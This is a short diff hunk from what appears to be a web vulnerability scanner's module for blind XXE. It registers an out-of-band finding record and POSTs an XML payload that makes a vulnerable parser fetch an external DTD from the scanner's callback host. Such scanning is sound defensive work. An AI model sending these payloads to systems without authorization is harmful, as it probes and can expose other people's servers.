@@ -86,6 +86,17 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
   %sx;
 ]>
 <r/>"""
+        ctx.oob.register(token, {
+            "category": "xxe",
+            "title": "XXE — blind, confirmed via out-of-band DTD fetch",
+            "severity": "critical", "cvss": 9.0,
+            "url": url, "payload": oob_body,
+            "evidence": "The XML parser fetched an external DTD from our out-of-band host — "
+                        "blind XXE confirmed even though no body is reflected.",
+            "_detection": "oob", "_method": "POST",
+            "_request": f"POST {url}\nContent-Type: application/xml\n\n{oob_body}",
+            "_oob_ref": f"{token}.{ctx.oob.backend.domain}",
+        })
         await ctx.http.post(url, data=oob_body,
                             headers={"Content-Type": "application/xml"})
         # poll OOB
